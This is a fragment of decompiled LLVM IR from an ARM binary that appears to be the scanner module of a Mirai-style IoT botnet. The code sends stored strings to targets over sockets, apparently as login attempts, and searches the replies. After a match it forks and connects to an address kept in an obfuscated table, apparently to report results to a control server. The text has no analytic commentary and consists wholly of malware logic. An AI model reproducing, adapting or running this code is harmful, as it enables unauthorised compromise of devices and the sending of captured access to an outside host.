  %v2_10e74 = inttoptr i32 %v1_10e74 to i8*
  %v3_10e74 = load i8, i8* %v2_10e74, align 1
  %v4_10e74 = zext i8 %v3_10e74 to i32
  store i32 %v4_10e74, i32* %r2.global-to-local, align 4
  %v2_10e78 = icmp ugt i8 %v3_10e74, 61
  store i1 %v2_10e78, i1* %cpsr_c.global-to-local, align 1
  %v7_10e78 = icmp eq i8 %v3_10e74, 62
  store i1 %v7_10e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e78, label %.thread742, label %bb1965

.thread742:                                       ; preds = %dec_label_pc_10e74
  %v1_10e80744 = add i32 %v0_10e80743, -1
  store i32 %v1_10e80744, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10e88

bb1965:                                           ; preds = %dec_label_pc_10e74
  %v3_10e7c = icmp ugt i8 %v3_10e74, 57
  store i1 %v3_10e7c, i1* %cpsr_c.global-to-local, align 1
  %v8_10e7c = icmp eq i8 %v3_10e74, 58
  store i1 %v8_10e7c, i1* %cpsr_z.global-to-local, align 1
  %v1_10e80 = add i32 %v0_10e80743, -1
  store i32 %v1_10e80, i32* %r3.global-to-local, align 4
  br i1 %v8_10e7c, label %dec_label_pc_10e88, label %dec_label_pc_10e54

dec_label_pc_10e88:                               ; preds = %bb1965, %dec_label_pc_10e64, %dec_label_pc_10e5c, %dec_label_pc_10e54, %dec_label_pc_10e40, %dec_label_pc_10e1c, %.thread742, %dec_label_pc_10e38, %dec_label_pc_10e30, %bb1964
  %v0_10e8c = phi i32 [ %v1_10e10, %dec_label_pc_10e40 ], [ %v1_10e10, %dec_label_pc_10e1c ], [ %v1_10e6c, %.thread742 ], [ %v1_10e10, %dec_label_pc_10e38 ], [ %v1_10e10, %dec_label_pc_10e30 ], [ %v1_10e10, %bb1964 ], [ %v1_10e6c, %dec_label_pc_10e54 ], [ %v1_10e6c, %dec_label_pc_10e5c ], [ %v1_10e6c, %dec_label_pc_10e64 ], [ %v1_10e6c, %bb1965 ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10e8c = add i32 %v0_10e8c, 1
  store i32 %v1_10e8c, i32* @r7, align 4
  %v1_10e90 = call i32 @table_unlock_val(i32 5)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_10ea0 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_10ea0, i32* %r0.global-to-local, align 4
  %v3_10ea4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10ea4, i32* %r2.global-to-local, align 4
  store i32 %v3_10ea0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10eb0 = load i32, i32* @r6, align 4
  %v1_10eb0 = add i32 %v0_10eb0, 4
  %v2_10eb0 = inttoptr i32 %v1_10eb0 to i32*
  %v3_10eb0 = load i32, i32* %v2_10eb0, align 4
  store i32 %v3_10eb0, i32* %r0.global-to-local, align 4
  %v4_10eb4 = call i32 @__libc_send(i32 %v3_10eb0, i32 %v3_10ea0, i32 %v3_10ea4, i32 16384)
  store i32 %v4_10eb4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10ec4 = load i32, i32* @r6, align 4
  %v1_10ec4 = add i32 %v0_10ec4, 4
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i32*
  %v3_10ec4 = load i32, i32* %v2_10ec4, align 4
  store i32 %v3_10ec4, i32* %r0.global-to-local, align 4
  %v4_10ec8 = call i32 @__libc_send(i32 %v3_10ec4, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10ed0 = call i32 @table_lock_val(i32 5)
  store i32 %v1_10ed0, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_10ed8 = load i32, i32* @r6, align 4
  %v2_10ed8 = add i32 %v1_10ed8, 12
  %v3_10ed8 = inttoptr i32 %v2_10ed8 to i32*
  store i32 6, i32* %v3_10ed8, align 4
  br label %dec_label_pc_107b0

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10b6c
  store i32 ptrtoint (i32* @global_var_1a860.226 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_10eec, i32* @r0, align 4
  %v0_10ef0 = call i32 @memcpy()
  store i32 9, i32* @r2, align 4
  store i32 %v2_10efc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1a857.228 to i32), i32* @r1, align 4
  %v0_10f04 = call i32 @memcpy()
  store i32 %v0_10f04, i32* %r0.global-to-local, align 4
  %v0_10f08 = load i32, i32* @r6, align 4
  %v1_10f08 = add i32 %v0_10f08, 24
  %v2_10f08 = inttoptr i32 %v1_10f08 to i32*
  %v3_10f08 = load i32, i32* %v2_10f08, align 4
  %v0_10f0c = load i32, i32* @r4, align 4
  %v1_10f0c = add i32 %v0_10f0c, 2
  store i32 %v1_10f0c, i32* %r2.global-to-local, align 4
  %v0_10f10 = load i32, i32* @sl, align 4
  %v2_10f10 = add i32 %v0_10f10, %v3_10f08
  store i32 %v2_10f10, i32* @r3, align 4
  %v3_10f14 = icmp uge i32 %v2_10f10, %v1_10f0c
  store i1 %v3_10f14, i1* %cpsr_c.global-to-local, align 1
  %v9_10f14 = icmp eq i32 %v2_10f10, %v1_10f0c
  store i1 %v9_10f14, i1* %cpsr_z.global-to-local, align 1
  %v2_10f18 = xor i1 %v3_10f14, true
  %v3_10f18 = or i1 %v9_10f14, %v2_10f18
  br i1 %v3_10f18, label %dec_label_pc_10ee0.dec_label_pc_10be8.loopexit_crit_edge, label %dec_label_pc_10f1c

dec_label_pc_10ee0.dec_label_pc_10be8.loopexit_crit_edge: ; preds = %dec_label_pc_10ee0
  %v0_10be8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10f1c:                               ; preds = %dec_label_pc_10ee0
  %v2_10f1c = inttoptr i32 %v1_10f0c to i8*
  %v3_10f1c = load i8, i8* %v2_10f1c, align 1
  %v4_10f1c = zext i8 %v3_10f1c to i32
  store i32 %v4_10f1c, i32* %r3.global-to-local, align 4
  %v2_10f20 = icmp ugt i8 %v3_10f1c, 30
  store i1 %v2_10f20, i1* %cpsr_c.global-to-local, align 1
  %v7_10f20 = icmp eq i8 %v3_10f1c, 31
  store i1 %v7_10f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f20, label %dec_label_pc_10fb4, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f1c
  %v1_10f28 = inttoptr i32 %v0_10f0c to i8*
  %v2_10f28 = load i8, i8* %v1_10f28, align 1
  %v3_10f28 = zext i8 %v2_10f28 to i32
  store i32 %v3_10f28, i32* %r3.global-to-local, align 4
  %v2_10f2c = icmp ugt i8 %v2_10f28, -4
  store i1 %v2_10f2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f2c = icmp eq i8 %v2_10f28, -3
  store i1 %v7_10f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f2c, label %.thread745, label %dec_label_pc_10f3c

.thread745:                                       ; preds = %dec_label_pc_10f28
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10f28, align 1
  %v0_10f38.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10f38.pr.pr, label %dec_label_pc_10b80, label %.thread745.dec_label_pc_10f3cthread-pre-split_crit_edge

.thread745.dec_label_pc_10f3cthread-pre-split_crit_edge: ; preds = %.thread745
  %v0_10f3c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f28, %.thread745.dec_label_pc_10f3cthread-pre-split_crit_edge
  %v0_10f3c.pr = phi i32 [ %v0_10f3c.pr.pre, %.thread745.dec_label_pc_10f3cthread-pre-split_crit_edge ], [ %v3_10f28, %dec_label_pc_10f28 ]
  %v2_10f3c = icmp ugt i32 %v0_10f3c.pr, 250
  store i1 %v2_10f3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f3c = icmp eq i32 %v0_10f3c.pr, 251
  store i1 %v7_10f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f3c, label %bb1966, label %dec_label_pc_10b80

bb1966:                                           ; preds = %dec_label_pc_10f3c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10f44 = load i32, i32* @r4, align 4
  %v4_10f44 = inttoptr i32 %v3_10f44 to i8*
  store i8 -3, i8* %v4_10f44, align 1
  br label %dec_label_pc_10b80

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10d58, %dec_label_pc_10d50, %dec_label_pc_10d48, %bb1961, %dec_label_pc_10d20, %dec_label_pc_10cfc, %.thread727, %dec_label_pc_10d18, %dec_label_pc_10d10, %bb1960
  %v0_10f50 = phi i32 [ %v1_10cf0, %dec_label_pc_10d20 ], [ %v1_10cf0, %dec_label_pc_10cfc ], [ %v1_10d60, %.thread727 ], [ %v1_10cf0, %dec_label_pc_10d18 ], [ %v1_10cf0, %dec_label_pc_10d10 ], [ %v1_10cf0, %bb1960 ], [ %v1_10d60, %bb1961 ], [ %v1_10d60, %dec_label_pc_10d48 ], [ %v1_10d60, %dec_label_pc_10d50 ], [ %v1_10d60, %dec_label_pc_10d58 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10f50 = add i32 %v0_10f50, 1
  store i32 %v1_10f50, i32* @r7, align 4
  %v1_10f54 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10f5c = call i32 @table_lock_val(i32 27)
  store i32 %v1_10f5c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10df0, %dec_label_pc_10f4c
  %v0_10f60 = load i32, i32* @r6, align 4
  %v1_10f60 = inttoptr i32 %v0_10f60 to i32*
  %v2_10f60 = load i32, i32* %v1_10f60, align 4
  store i32 %v2_10f60, i32* %r3.global-to-local, align 4
  %v1_10f64 = add i32 %v0_10f60, 4
  %v2_10f64 = inttoptr i32 %v1_10f64 to i32*
  %v3_10f64 = load i32, i32* %v2_10f64, align 4
  store i32 %v3_10f64, i32* %r0.global-to-local, align 4
  %v1_10f68 = add i32 %v2_10f60, 12
  %v2_10f68 = inttoptr i32 %v1_10f68 to i8*
  %v3_10f68 = load i8, i8* %v2_10f68, align 1
  %v4_10f68 = zext i8 %v3_10f68 to i32
  store i32 %v4_10f68, i32* %r2.global-to-local, align 4
  %v1_10f6c = inttoptr i32 %v2_10f60 to i32*
  %v2_10f6c = load i32, i32* %v1_10f6c, align 4
  store i32 %v2_10f6c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10f74 = call i32 @__libc_send(i32 %v3_10f64, i32 %v2_10f6c, i32 %v4_10f68, i32 16384)
  store i32 %v4_10f74, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10f7c = load i32, i32* @r6, align 4
  %v1_10f7c = add i32 %v0_10f7c, 4
  %v2_10f7c = inttoptr i32 %v1_10f7c to i32*
  %v3_10f7c = load i32, i32* %v2_10f7c, align 4
  store i32 %v3_10f7c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10f88 = call i32 @__libc_send(i32 %v3_10f7c, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 %v4_10f88, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_10f90 = load i32, i32* @r6, align 4
  %v2_10f90 = add i32 %v1_10f90, 12
  %v3_10f90 = inttoptr i32 %v2_10f90 to i32*
  store i32 4, i32* %v3_10f90, align 4
  br label %.thread1199

dec_label_pc_10f98:                               ; preds = %dec_label_pc_10c5c, %dec_label_pc_10c54, %bb1957, %dec_label_pc_10c2c, %dec_label_pc_10c10, %.thread719, %dec_label_pc_10c24, %bb1956
  %v0_10f9c = phi i32 [ %v1_10c04, %dec_label_pc_10c2c ], [ %v1_10c04, %dec_label_pc_10c10 ], [ %v1_10c64, %.thread719 ], [ %v1_10c04, %dec_label_pc_10c24 ], [ %v1_10c04, %bb1956 ], [ %v1_10c64, %bb1957 ], [ %v1_10c64, %dec_label_pc_10c54 ], [ %v1_10c64, %dec_label_pc_10c5c ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10f9c = add i32 %v0_10f9c, 1
  store i32 %v1_10f9c, i32* @r7, align 4
  %v1_10fa0 = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_10cb4

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10770
  %v0_10fa8 = load i32, i32* @r6, align 4
  store i32 %v0_10fa8, i32* @r0, align 4
  %v0_10fac = call i32 @setup_connection()
  store i32 %v0_10fac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107ac

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10f1c
  store i32 %v2_10eec, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_10fc4 = add i32 %v0_10f08, 4
  %v2_10fc4 = inttoptr i32 %v1_10fc4 to i32*
  %v3_10fc4 = load i32, i32* %v2_10fc4, align 4
  store i32 %v3_10fc4, i32* %r0.global-to-local, align 4
  %v4_10fc8 = call i32 @__libc_send(i32 %v3_10fc4, i32 %v2_10eec, i32 3, i32 16384)
  store i32 %v4_10fc8, i32* %r0.global-to-local, align 4
  store i32 %v2_10ef4, i32* %r1.global-to-local, align 4
  %v0_10fd0 = load i32, i32* @r6, align 4
  %v1_10fd0 = add i32 %v0_10fd0, 4
  %v2_10fd0 = inttoptr i32 %v1_10fd0 to i32*
  %v3_10fd0 = load i32, i32* %v2_10fd0, align 4
  store i32 %v3_10fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10bcc

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10624
  store i32 %.pre, i32* @r0, align 4
  %v1_10fe8 = add i32 %v0_10fe0, 92
  store i32 %v1_10fe8, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10ff0 = call i32 @memmove(i32 %.pre, i32 %v1_10fe8, i32 192)
  store i32 %v3_10ff0, i32* %r0.global-to-local, align 4
  %v0_10ff4 = load i32, i32* @r6, align 4
  %v1_10ff4 = add i32 %v0_10ff4, 24
  %v2_10ff4 = inttoptr i32 %v1_10ff4 to i32*
  %v3_10ff4 = load i32, i32* %v2_10ff4, align 4
  %v1_10ff8 = add i32 %v3_10ff4, -64
  store i32 %v1_10ff8, i32* %r3.global-to-local, align 4
  store i32 %v1_10ff8, i32* %v2_10ff4, align 4
  br label %dec_label_pc_10634

dec_label_pc_11004:                               ; preds = %dec_label_pc_105dc
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e588, i32* %r3.global-to-local, align 4
  store i32 %v2_10d7c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_1102c = call i32 @getsockopt(i32 %v3_105d0, i32 1, i32 4, i32 %v2_e588, i32 %v2_10d7c)
  %v3_11030 = load i8, i8* %stack_var_-56, align 1
  %v4_11030 = sext i8 %v3_11030 to i32
  store i32 %v4_11030, i32* %r3.global-to-local, align 4
  %v2_11034 = or i32 %v4_11030, %v5_1102c
  store i32 %v2_11034, i32* %r0.global-to-local, align 4
  %v4_11034 = icmp eq i32 %v2_11034, 0
  store i1 %v4_11034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_11034, label %dec_label_pc_1103c, label %dec_label_pc_111a8

dec_label_pc_1103c:                               ; preds = %dec_label_pc_11004
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_11040 = load i32, i32* @r6, align 4
  %v2_11040 = add i32 %v1_11040, 12
  %v3_11040 = inttoptr i32 %v2_11040 to i32*
  store i32 2, i32* %v3_11040, align 4
  %v0_11044 = call i32 @rand_next()
  %v2_1104c = load i16, i16* bitcast (i16** @global_var_2327c.141 to i16*), align 4
  %v3_1104c = zext i16 %v2_1104c to i32
  %v3_11050 = urem i32 %v0_11044, %v3_1104c
  store i32 ptrtoint (i32* @global_var_2324c.137 to i32), i32* %r0.global-to-local, align 4
  %v2_11058 = load i32, i32* @global_var_2324c.137, align 4
  store i32 %v2_11058, i32* @lr, align 4
  %v1_11060 = load i32, i32* @r4, align 4
  %v9_11060 = icmp eq i32 %v2_11058, %v1_11060
  store i1 %v9_11060, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_11050, i32* %r1.global-to-local, align 4
  %v7_11068 = icmp sgt i32 %v2_11058, %v1_11060
  br i1 %v7_11068, label %dec_label_pc_1106c, label %dec_label_pc_112dc

dec_label_pc_1106c:                               ; preds = %dec_label_pc_1103c
  %v2_11070 = load i32, i32* @global_var_23278.139, align 4
  store i32 %v2_11070, i32* %ip.global-to-local, align 4
  store i32 %v1_11060, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11084

dec_label_pc_1107c:                               ; preds = %dec_label_pc_1109c, %dec_label_pc_11084
  %v9_1107c = icmp eq i32 %v1_11090, %v2_11058
  br i1 %v9_1107c, label %dec_label_pc_112dc.loopexit, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %dec_label_pc_1107c, %dec_label_pc_1106c
  %v0_11090 = phi i32 [ %v1_11090, %dec_label_pc_1107c ], [ %v1_11060, %dec_label_pc_1106c ]
  %v0_1109c = phi i32 [ %v1_11094, %dec_label_pc_1107c ], [ %v2_11070, %dec_label_pc_1106c ]
  store i32 %v0_1109c, i32* %r0.global-to-local, align 4
  %v1_11088 = add i32 %v0_1109c, 8
  %v2_11088 = inttoptr i32 %v1_11088 to i16*
  %v3_11088 = load i16, i16* %v2_11088, align 2
  %v4_11088 = zext i16 %v3_11088 to i32
  store i32 %v4_11088, i32* %r3.global-to-local, align 4
  %v1_11090 = add i32 %v0_11090, 1
  store i32 %v1_11090, i32* %r2.global-to-local, align 4
  %v1_11094 = add i32 %v0_1109c, 16
  store i32 %v1_11094, i32* %ip.global-to-local, align 4
  %tmp1967 = icmp ugt i32 %v4_11088, %v3_11050
  br i1 %tmp1967, label %dec_label_pc_1107c, label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %dec_label_pc_11084
  %v1_1109c = add i32 %v0_1109c, 10
  %v2_1109c = inttoptr i32 %v1_1109c to i16*
  %v3_1109c = load i16, i16* %v2_1109c, align 2
  %v4_1109c = zext i16 %v3_1109c to i32
  store i32 %v4_1109c, i32* %r3.global-to-local, align 4
  %v3_110a0 = icmp uge i32 %v4_1109c, %v3_11050
  %v9_110a0 = icmp eq i32 %v4_1109c, %v3_11050
  %v2_110a4 = xor i1 %v3_110a0, true
  %v3_110a4 = or i1 %v9_110a0, %v2_110a4
  br i1 %v3_110a4, label %dec_label_pc_1107c, label %dec_label_pc_110a8.loopexit

dec_label_pc_110a8.loopexit:                      ; preds = %dec_label_pc_1109c
  store i1 %v3_110a0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_110a8

dec_label_pc_110a8:                               ; preds = %dec_label_pc_110a8.loopexit, %dec_label_pc_112dc
  %v0_110bc = phi i32 [ %v0_1109c, %dec_label_pc_110a8.loopexit ], [ 0, %dec_label_pc_112dc ]
  %v0_110a8 = load i32, i32* @r6, align 4
  %v1_110a8 = add i32 %v0_110a8, 4
  %v2_110a8 = inttoptr i32 %v1_110a8 to i32*
  %v3_110a8 = load i32, i32* %v2_110a8, align 4
  %v3_110ac = udiv i32 %v3_110a8, 32
  store i32 %v3_110ac, i32* %r2.global-to-local, align 4
  %v1_110b0 = urem i32 %v3_110a8, 32
  store i32 %v1_110b0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_110b4 = mul nuw nsw i32 %v3_110ac, 4
  store i32 %v3_110b4, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_110bc = inttoptr i32 %v0_110a8 to i32*
  store i32 %v0_110bc, i32* %v2_110bc, align 4
  %v0_110c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_110c0 = load i32, i32* @r6, align 4
  %v2_110c0 = add i32 %v1_110c0, 24
  %v3_110c0 = inttoptr i32 %v2_110c0 to i32*
  store i32 %v0_110c0, i32* %v3_110c0, align 4
  %v0_10604.pre = load i32, i32* @ip, align 4
  %v1_1060c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10600

dec_label_pc_110fc:                               ; preds = %dec_label_pc_10738
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_11108 = call i32 @table_unlock_val(i32 9)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_11118 = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_11118, i32* %r0.global-to-local, align 4
  %v3_1111c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_11118, i32* %r2.global-to-local, align 4
  %v1_11124 = add i32 %v3_1111c, -1
  store i32 %v1_11124, i32* %r3.global-to-local, align 4
  %v0_11128 = load i32, i32* @r6, align 4
  %v1_11128 = add i32 %v0_11128, 24
  %v2_11128 = inttoptr i32 %v1_11128 to i32*
  %v3_11128 = load i32, i32* %v2_11128, align 4
  store i32 %v3_11128, i32* %r1.global-to-local, align 4
  %v0_1112c = load i32, i32* @sl, align 4
  store i32 %v0_1112c, i32* %r0.global-to-local, align 4
  %v4_11130 = call i32 @util_memsearch(i32 %v0_1112c, i32 %v3_11128, i32 %v3_11118, i32 %v1_11124)
  store i32 %v4_11130, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_1113c = call i32 @table_lock_val(i32 9)
  store i32 %v1_1113c, i32* %r0.global-to-local, align 4
  %v0_11140 = load i32, i32* @r7, align 4
  %v2_11140 = icmp eq i32 %v0_11140, -1
  store i1 %v2_11140, i1* %cpsr_c.global-to-local, align 1
  %v7_11140 = icmp eq i32 %v0_11140, -1
  store i1 %v7_11140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11140, label %dec_label_pc_10618.loopexit, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_110fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11148 = icmp eq i32 %v0_11140, 0
  store i1 %v2_11148, i1* %cpsr_z.global-to-local, align 1
  %tmp1968 = icmp slt i32 %v0_11140, 1
  br i1 %tmp1968, label %.thread1199, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11148
  %v0_11150 = load i32, i32* @r6, align 4
  %v1_11150 = add i32 %v0_11150, 20
  %v2_11150 = inttoptr i32 %v1_11150 to i16*
  %v3_11150 = load i16, i16* %v2_11150, align 2
  %v4_11150 = zext i16 %v3_11150 to i32
  store i32 %v4_11150, i32* %r3.global-to-local, align 4
  %v1_11154 = add i32 %v0_11150, 16
  %v2_11154 = inttoptr i32 %v1_11154 to i32*
  %v3_11154 = load i32, i32* %v2_11154, align 4
  store i32 %v3_11154, i32* %r2.global-to-local, align 4
  store i32 %v2_11158, i32* %ip.global-to-local, align 4
  store i32 %v4_11150, i32* %stack_var_-42, align 4
  store i32 %v3_11154, i32* %stack_var_-60, align 4
  %v1_11164 = inttoptr i32 %v0_11150 to i32*
  %v2_11164 = load i32, i32* %v1_11164, align 4
  store i32 %v2_11164, i32* @r8, align 4
  %v0_11168 = call i32 @__libc_fork()
  store i32 %v0_11168, i32* %r0.global-to-local, align 4
  %v7_1116c = icmp eq i32 %v0_11168, -1
  %.2044 = zext i1 %v7_1116c to i32
  store i32 %.2044, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11178 = icmp eq i32 %v0_11168, 0
  store i1 %v2_11178, i1* %cpsr_z.global-to-local, align 1
  %tmp1971 = icmp slt i32 %v0_11168, 1
  br i1 %tmp1971, label %bb1972, label %.thread751

.thread751:                                       ; preds = %dec_label_pc_11150
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1118c

bb1972:                                           ; preds = %dec_label_pc_11150
  store i32 %.2044, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11184 = icmp eq i1 %v7_1116c, false
  store i1 %v2_11184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11184, label %dec_label_pc_111c4, label %dec_label_pc_1118c

dec_label_pc_1118c:                               ; preds = %.thread751, %bb1972, %bb1974
  %v0_1118c = load i32, i32* @r6, align 4
  %v1_1118c = add i32 %v0_1118c, 4
  %v2_1118c = inttoptr i32 %v1_1118c to i32*
  %v3_1118c = load i32, i32* %v2_1118c, align 4
  store i32 %v3_1118c, i32* %r0.global-to-local, align 4
  %v1_11190 = call i32 @__GI___libc_close(i32 %v3_1118c)
  store i32 %v1_11190, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1119c = load i32, i32* @r6, align 4
  %v2_1119c = add i32 %v1_1119c, 4
  %v3_1119c = inttoptr i32 %v2_1119c to i32*
  store i32 -1, i32* %v3_1119c, align 4
  %v0_111a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_111a0 = load i32, i32* @r6, align 4
  %v2_111a0 = add i32 %v1_111a0, 12
  %v3_111a0 = inttoptr i32 %v2_111a0 to i32*
  store i32 %v0_111a0, i32* %v3_111a0, align 4
  br label %.thread1199

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11004
  %v0_111a8 = load i32, i32* @r6, align 4
  %v1_111a8 = add i32 %v0_111a8, 4
  %v2_111a8 = inttoptr i32 %v1_111a8 to i32*
  %v3_111a8 = load i32, i32* %v2_111a8, align 4
  store i32 %v3_111a8, i32* %r0.global-to-local, align 4
  %v1_111ac = call i32 @__GI___libc_close(i32 %v3_111a8)
  store i32 %v1_111ac, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_111b4 = load i32, i32* @r4, align 4
  %v1_111b4 = load i32, i32* @r6, align 4
  %v2_111b4 = add i32 %v1_111b4, 12
  %v3_111b4 = inttoptr i32 %v2_111b4 to i32*
  store i32 %v0_111b4, i32* %v3_111b4, align 4
  %v0_111b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_111b8 = load i32, i32* @r6, align 4
  %v2_111b8 = add i32 %v1_111b8, 4
  %v3_111b8 = inttoptr i32 %v2_111b8 to i32*
  store i32 %v0_111b8, i32* %v3_111b8, align 4
  %v0_111bc = load i32, i32* @r4, align 4
  %v1_111bc = trunc i32 %v0_111bc to i8
  %v2_111bc = load i32, i32* @r6, align 4
  %v3_111bc = add i32 %v2_111bc, 284
  %v4_111bc = inttoptr i32 %v3_111bc to i8*
  store i8 %v1_111bc, i8* %v4_111bc, align 1
  br label %dec_label_pc_10720

dec_label_pc_111c4:                               ; preds = %bb1972
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_111d0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_111d0, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_111dc = call i32 @table_unlock_val(i32 2)
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1a77c.87 to i32), i32* @r0, align 4
  %v2_111f0 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1a77c.87 to i32))
  %v0_111f4 = load i32, i32* @r5, align 4
  store i32 %v0_111f4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_11200 = inttoptr i32 %v0_111f4 to i32*
  %v3_11200 = call i32 @table_retrieve_val(i32 2, i32* %v2_11200)
  store i32 %v2_11158, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_11214 = call i32 @table_lock_val(i32 2)
  %v0_1121c = load i32, i32* @r4, align 4
  store i32 %v0_1121c, i32* %r0.global-to-local, align 4
  store i32 %v2_11220, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11228 = call i32 @__libc_connect(i32 %v0_1121c, i32 %v2_11220, i32 16)
  store i32 %v3_11228, i32* %r0.global-to-local, align 4
  %v2_1122c = icmp eq i32 %v3_11228, -1
  store i1 %v2_1122c, i1* %cpsr_c.global-to-local, align 1
  %v7_1122c = icmp eq i32 %v3_11228, -1
  store i1 %v7_1122c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1122c, label %bb1973, label %bb1974

bb1973:                                           ; preds = %dec_label_pc_111c4
  %v1_11230 = load i32, i32* @r4, align 4
  store i32 %v1_11230, i32* %r0.global-to-local, align 4
  br label %bb1974

bb1974:                                           ; preds = %dec_label_pc_111c4, %bb1973
